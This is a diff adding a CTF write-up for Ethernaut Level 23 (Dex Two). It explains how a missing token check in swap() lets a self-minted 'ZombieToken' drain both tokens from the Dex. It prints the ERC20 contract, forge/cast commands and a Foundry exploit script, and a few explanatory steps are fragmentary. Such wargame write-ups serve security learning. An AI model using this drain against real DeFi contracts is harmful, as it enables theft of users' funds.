@@ -1,0 +1,87 @@
+"This level is similar to Level 22 - Dex with a small modification in the swap() function. Our player has been provided with 10 tokens each of token1 and token2, the two types of tokens handled by the Dex. The Dex contract has a balance of 100 tokens each.
+swap()
+To complete this level, we need to drain all the tokens from Dex Two (both token1 and token2). Let's dive in.
+Before going forward, I would highly recommend doing the Level 22 - Dex before this one as I won't be going over the whole contract as that has been done previously. 
+Let's take a look at the vulnerable function - 
+function swap(address from, address to, uint amount) public {
+    require(IERC20(from).balanceOf(msg.sender) >= amount, ""Not enough to swap"");
+    uint swapAmount = getSwapAmount(from, to, amount);
+    IERC20(from).transferFrom(msg.sender, address(this), amount);
+    IERC20(to).approve(address(this), swapAmount);
+    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+}
+
+If we will compare the same function from the previous level, we will see that there's a line missing in this one which is -
+require((from == token1 && to == token2) || (from == token2 && to == token1), ""Invalid tokens"");
+
+It is responsible for validating if the swapping is happening only for the two token addresses defined by the contract. Since this is absent from Dex Two, we are allowed to swap any tokens. Even the ones we create. This is what we have to do to drain the Dex Two.
+To exploit the Dex Two, here's what we have to do:
+msg.sender
+get_swap_amount()
+100 = (x * 100)/200
+x = 200 ZTN
+The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.
+
+Now it should be clear why we chose 400 ZTN to start with. Let's deploy our exploit code. 
+Let us first deploy our ZombieToken ERC20 contract:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
+
+contract ZombieToken is ERC20 {
+    constructor(uint256 initialSupply) ERC20(""ZombieToken"", ""ZTN"") public {
+        _mint(msg.sender, initialSupply);
+    }
+}
+
+forge create ZombieToken --private-key $PKEY --rpc-url $RPC_URL --constructor-args 400
+
+
+The addresses used in the commands that follow below are:
+balanceOf()
+cast call 0xAFE3F881306476e9F6B88cFB224E66d5484c22C1 ""balanceOf(address)"" ""0xEAce4b71CA1A128e8B562561f46896D55B9B0246"" --private-key $PKEY --rpc-url $RPC_URL | cast --to-dec
+
+
+ERC20 function signatures can be looked up here
+cast send 0xAFE3F881306476e9F6B88cFB224E66d5484c22C1 ""transfer(address,uint256)"" ""0xcEba857710790f945EC26A5B96Ef6D495F4BF3A5"" ""100"" --private-key $PKEY --rpc-url $RPC_URL
+
+
+cast send 0xAFE3F881306476e9F6B88cFB224E66d5484c22C1 ""approve(address,uint256)"" ""0xcEba857710790f945EC26A5B96Ef6D495F4BF3A5"" ""300"" --private-key $PKEY --rpc-url $RPC_URL
+
+
+Now it's time to execute our exploit script:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel23.sol"";
+
+contract POC is Script {
+
+    DexTwo level23 = DexTwo(0xcEba857710790f945EC26A5B96Ef6D495F4BF3A5);
+    function run() external{
+        vm.startBroadcast();
+        address ZTN = address(0xAFE3F881306476e9F6B88cFB224E66d5484c22C1);
+        address token1 = level23.token1();
+        address token2 = level23.token2();
+
+        level23.swap(ZTN, token1, 100);
+        level23.swap(ZTN, token2, 200);
+
+        console.log(""Remaining token1 balance : "", level23.balanceOf(token1, address(level23)));
+        console.log(""Remaining token2 balance : "", level23.balanceOf(token2, address(level23)));
+        vm.stopBroadcast();
+    }
+}
+
+We have defined addresses for all the tokens used for swapping and calling the swap() function, once with token1 for 100 tokens and then with token2 for 200 tokens. The final balance for the Dex is logged to the console. 
+swap()
+Run the script with the following command:
+forge script ./script/level23.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv
+
+
+We have successfully drained the Dex Two. The instance can now be submitted to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e..
+dev.to/nvn/ethernaut-hacks-level-23-dex-two.."
